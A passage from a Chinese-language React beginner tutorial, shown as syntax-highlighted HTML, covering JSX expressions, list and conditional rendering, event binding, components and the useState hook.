comment">/* 使用引号传递字符串 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token string">'This is a String'</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 使用JS变量 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/*函数调用和方法调用*/</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 使用JavaScript对象 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token literal-property property">fontSize</span><span class="token operator">:</span><span class="token number">50</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">我变红，变大了吗？</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.35.34.png" alt="截屏2024-12-10 15.35.34"></p><h2 id="3-4-JSX高频场景-列表渲染"><a href="#3-4-JSX高频场景-列表渲染" class="headerlink" title="3.4 JSX高频场景-列表渲染"></a>3.4 JSX高频场景-列表渲染</h2><p>在JSX中可以使用原生js种的<code>map方法</code> 实现列表渲染。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> list <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1001</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'Vue'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1002</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'React'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1003</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Angular'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 渲染列表 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* map 循环哪个结构 return结构*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 注意事项：加上一个独一无二的key,字符串或者number idt*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* key的作用：React框架内部使用 提升更新性能的 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token operator">=&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>js中的箭头函数：</p><p>在JavaScript中，箭头函数（Arrow Function）是ES6（ECMAScript 2015）引入的一种新的函数写法，它提供了一种更简洁的方式来写函数，箭头函数的语法比传统的函数表达式更短，这些函数表达式更适用于那些函数体较短且不需要使用 <code>function</code> 关键字的场景。</p><p>箭头函数的基本语法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token comment">// 函数体</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果函数体只有一条语句，可以省略花括号，并且隐式返回该语句的结果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只有一个参数，可以省略参数周围的括号：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token parameter">param</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有参数的函数需要使用一对空括号：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="3-5-条件渲染"><a href="#3-5-条件渲染" class="headerlink" title="3.5 条件渲染"></a>3.5 条件渲染</h2><h3 id="3-5-1-基础条件渲染"><a href="#3-5-1-基础条件渲染" class="headerlink" title="3.5.1 基础条件渲染"></a>3.5.1 基础条件渲染</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token keyword">const</span> loading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>flag <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>loading <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>一种显示的情况：用&amp;&amp;运算符</p></li><li><p>两种显示的情况：三元运算符</p></li><li><p>三种显示的情况：if else</p></li></ul><h3 id="3-5-2-复杂条件渲染"><a href="#3-5-2-复杂条件渲染" class="headerlink" title="3.5.2 复杂条件渲染"></a>3.5.2 复杂条件渲染</h3><ul><li>需求：列表中需要根据文章的状态适配</li><li>解决方案：自定义函数 + 判断语句</li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> articleType<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">// 0无图 1单图 2双图</span><span class="token keyword">function</span> <span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">无图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">单图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">双图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">"red"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">参数错误！</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、React中的事件绑定"><a href="#四、React中的事件绑定" class="headerlink" title="四、React中的事件绑定"></a>四、React中的事件绑定</h1><h2 id="4-1-基础事件绑定"><a href="#4-1-基础事件绑定" class="headerlink" title="4.1  基础事件绑定"></a>4.1  基础事件绑定</h2><p>React中的事件绑定，通过语法 <code>on + 事件名称 = { 事件处理程序 }</code>，整体上遵循驼峰命名法。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">btnClickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"按钮被点击了！"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 基础事件绑定 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>btnClickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">点我</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> //不用传参的情况    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.39.47.png" style="zoom:50%;"><h2 id="4-2-使用事件参数"><a href="#4-2-使用事件参数" class="headerlink" title="4.2 使用事件参数"></a>4.2 使用事件参数</h2><p>在事件回调函数中设置形参e即可。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button按钮点击了'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>事件对象e：</p><p><code>e</code> 是一个参数，它代表事件对象（Event object）。当你在 React 组件中使用 <code>onClick</code> 属性时，浏览器会自动将生成的事件对象作为参数传递给绑定的事件处理函数。</p><p>具体来说，当你点击 <code>&lt;button&gt;</code> 元素时，会触发一个点击事件（<code>click</code> event），浏览器会创建一个事件对象 <code>e</code>，其中包含了关于这个事件的详细信息，比如：</p><ul><li><code>e.type</code>：事件的类型，这里是 <code>"click"</code>。</li><li><code>e.target</code>：触发事件的元素，这里是 <code>&lt;button&gt;</code> 元素。</li><li><code>e.currentTarget</code>：事件绑定的元素，如果事件被冒泡，这里可能与 <code>e.target</code> 不同。</li><li><code>e.preventDefault()</code>：一个方法，用于阻止事件的默认行为。</li><li><code>e.stopPropagation()</code>：一个方法，用于阻止事件继续传播到父元素。</li><li><code>e.clientX</code> 和 <code>e.clientY</code>：鼠标点击时的位置坐标。</li><li>等等。</li></ul></blockquote><h2 id="4-3-传递自定义参数"><a href="#4-3-传递自定义参数" class="headerlink" title="4.3 传递自定义参数"></a>4.3 传递自定义参数</h2><p>语法：事件绑定的位置改造成箭头函数的写法，在执行clickHandler实际处理业务函数的时候传递实参。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.46.36.png" style="zoom:35%;"><p>注意：不能直接写函数调用，这里事件绑定需要一个函数引用。</p><h2 id="4-4-同时传递事件对象和自定义参数"><a href="#4-4-同时传递事件对象和自定义参数" class="headerlink" title="4.4 同时传递事件对象和自定义参数"></a>4.4 同时传递事件对象和自定义参数</h2><p>语法：在事件绑定的位置传递事件实参e和自定义参数，clickHandler中声明形参，注意顺序对应。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button按钮点击了'</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span>e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、React组件"><a href="#五、React组件" class="headerlink" title="五、React组件"></a>五、React组件</h1><h2 id="5-1-组件是什么"><a href="#5-1-组件是什么" class="headerlink" title="5.1 组件是什么"></a>5.1 组件是什么</h2><p>概念：一个组件就是一个用户界面的一部分，它可以有自己的逻辑和外观，组件之间可以互相嵌套，也可以复用多次。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.13.36.png" style="zoom:40%;"><p>组件化开发可以让开发者像搭积木一样构建一个完整的庞大的应用。</p><h2 id="5-2-组件基础使用"><a href="#5-2-组件基础使用" class="headerlink" title="5.2 组件基础使用"></a>5.2 组件基础使用</h2><p>在React中，一个组件就是<strong>首字母大写的函数</strong>，内部存放了组件的逻辑和视图UI, 渲染组件只需要把组件当成标签书写即可。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. 定义组件</span><span class="token keyword">function</span> <span class="token function">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 内部逻辑</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token comment">// 可以用箭头函数的方法</span><span class="token comment">// const MyButton2 = ()=&gt;{</span><span class="token comment">//   return &lt;button&gt;Click Me 2&lt;/button&gt;  </span><span class="token comment">// }</span><span class="token comment">// 2. 使用组件</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 自闭和 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 成对标签 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="六、useState"><a href="#六、useState" class="headerlink" title="六、useState"></a>六、useState</h1><h2 id="6-1-基础使用"><a href="#6-1-基础使用" class="headerlink" title="6.1 基础使用"></a>6.1 基础使用</h2><p>useState 是一个 React Hook（函数），它允许我们向组件添加一个<code>状态变量</code>, 从而控制影响组件的渲染结果。</p><p>和普通JS变量不同的是，状态变量一旦发生变化组件的视图UI也会跟着变化（数据驱动视图）。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.29.45.png" style="zoom:20%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// useState实现一个计数器按钮</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. 调用useState添加一个状态变量</span>  <span class="token comment">// count 状态变量</span>  <span class="token comment">// setCount 修改状态变量的方法</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">// 2. 点击事件回调</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 作用: </span>    <span class="token comment">// 1. 用传入的新值修改count</span>    <span class="token comment">// 2. 重新使用新的count渲染UI</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-2-状态的修改规则"><a href="#6-2-状态的修改规则" class="headerlink" title="6.2 状态的修改规则"></a>6.2 状态的修改规则</h2><p>在React中状态被认为是只读的，我们应该始终<code>替换它而不是修改它</code>, 直接修改状态不能引发视图更新。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.39.41.png" style="zoom:50%;"><h2 id="6-3-修改对象的状态"><a href="#6-3-修改对象的状态" class="headerlink" title="6.3 修改对象的状态"></a>6.3 修改对象的状态</h2><p>对于对象类型的状态变量，应该始终给set方法一个<code>全新的对象</code> 来进行修改。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.50.21.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 直接修改 无法引发视图更新</span>    <span class="token comment">// count++</span>    <span class="token comment">// console.log(count)</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment">// 修改对象状态</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>form<span class="token punctuation">,</span> setForm<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">changeForm</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 错误写法：直接修改</span>    <span class="token comment">// form.name = 'john'</span>    <span class="token comment">// 正确写法：setFrom 传入一个全新的对象</span>    <span class="token function">setForm</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token operator">...</span>form<span class="token punctuation">,</span>      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'john'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token 